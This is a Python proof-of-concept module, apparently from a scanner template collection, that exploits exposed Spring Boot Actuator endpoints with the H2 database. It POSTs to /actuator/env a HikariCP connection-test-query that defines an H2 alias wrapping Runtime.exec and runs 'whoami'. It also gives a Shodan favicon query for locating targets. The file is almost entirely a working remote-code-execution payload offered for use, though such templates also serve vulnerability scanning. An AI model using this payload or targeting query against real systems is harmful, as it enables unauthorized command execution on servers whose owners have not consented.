import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Spring Boot H2 Database RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database", 
            "https://twitter.com/pyn3rd/status/1305151887964946432", 
            "https://www.veracode.com/blog/research/exploiting-spring-boot-actuators", 
            "https://github.com/spaceraccoon/spring-boot-actuator-h2-rce"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.favicon.hash:116323821'''
        },
        "tags": ["springboot", "rce", "jolokia"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/actuator/env"""
        method = "POST"
        data = """{
  "name":"spring.datasource.hikari.connection-test-query",
  "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
}"""
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url